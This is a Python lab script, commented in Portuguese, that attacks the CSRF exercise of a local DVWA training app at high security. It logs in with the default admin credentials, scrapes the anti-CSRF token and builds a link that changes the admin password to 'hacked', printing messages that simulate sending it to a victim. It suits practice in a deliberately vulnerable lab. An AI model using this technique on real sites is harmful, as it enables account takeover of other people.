from bs4 import BeautifulSoup
import sys
from requests import Session
from datetime import datetime
from tqdm import tqdm  # Para a barra de progresso
import os

BASE_URL = "http://localhost/dvwa/"
CSRF_URL = f"{BASE_URL}/vulnerabilities/csrf/"

BASE_PATH = os.path.dirname(os.path.realpath(__file__))


FORM_NAME = "malicious_form.html"
FORM_PATH = os.path.join(BASE_PATH, FORM_NAME)


def get_list(filename):
    with open(filename, 'r') as file:
        return file.read().splitlines()

def send_command(session, url, data):
    response = session.post(url, data=data)
    return response

def extract_message(response):
    soup = BeautifulSoup(response.text, 'html.parser')
    message_div = soup.find("div", {"class": "message"})
    if message_div:
        return message_div.text.strip()
    return None

def extract_output_message(response):
    soup = BeautifulSoup(response.text, 'html.parser')
    form = soup.find("form")  # Encontra o formulário de login
    if form:
        next_sibling = form.find_next_sibling()
        if next_sibling and next_sibling.name in ["p", "pre"]:
            return next_sibling.text.strip()
    return None

def log(command, status, output):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"[{timestamp}] Comando: {command}, Status: {status}, Saída: \n{output}"
    with open(LOG_PATH, "a") as log_file:
        log_file.write(log_entry + "\n")
        
def login(session):
    login_url = f"{BASE_URL}/login.php"

    response = session.get(login_url)
    soup = BeautifulSoup(response.text, 'html.parser')
    user_token = soup.find("input", {"name": "user_token"})["value"]

    login_data = {
        "username": "admin",
        "password": "password",
        "user_token": user_token,
        "Login": "Login"
    }
    response = session.post(login_url, data=login_data)

    if "Welcome" not in response.text:
        print("[-] Falha no login. Verifique as credenciais.")
        sys.exit(1)

def set_sec(session):
    security_level = "high"
    security_url = f"{BASE_URL}/security.php"

    response = session.get(security_url)
    soup = BeautifulSoup(response.text, 'html.parser')
    user_token = soup.find("input", {"name": "user_token"})["value"]

    security_data = {
        "security": security_level,
        "seclev_submit": "Submit",
        "user_token": user_token
    }
    response = session.post(security_url, data=security_data)

    message = extract_message(response)
    if message:
        print(f"[+] Mensagem: {message}")
        if "CSRF token is incorrect" in message:
            print("[-] Token CSRF incorreto. Encerrando o script.")
            sys.exit(1)

def extract_csrf_token(session):
    response = session.get(CSRF_URL)
    soup = BeautifulSoup(response.text, 'html.parser')
    csrf_token = soup.find("input", {"name": "user_token"})["value"]
    return csrf_token

def main():
    session = Session()
    login(session)
    set_sec(session)
    csrf_token = extract_csrf_token(session)
    
    data = {
        "password_new": "hacked",
        "password_conf": "hacked",
        "user_token": csrf_token,
        "Change": "Change"
    }
    
    response = session.get(CSRF_URL,params=data)
    print(f"[+] Link malicioso: {response.url}")
    print(f"[+] Enviando para vítima...")
    print(f"[+] Link Acessado!")
    message = extract_output_message(response)
    if message:
        print(f"[+] Mensagem: {message}")

if __name__ == "__main__":
    main()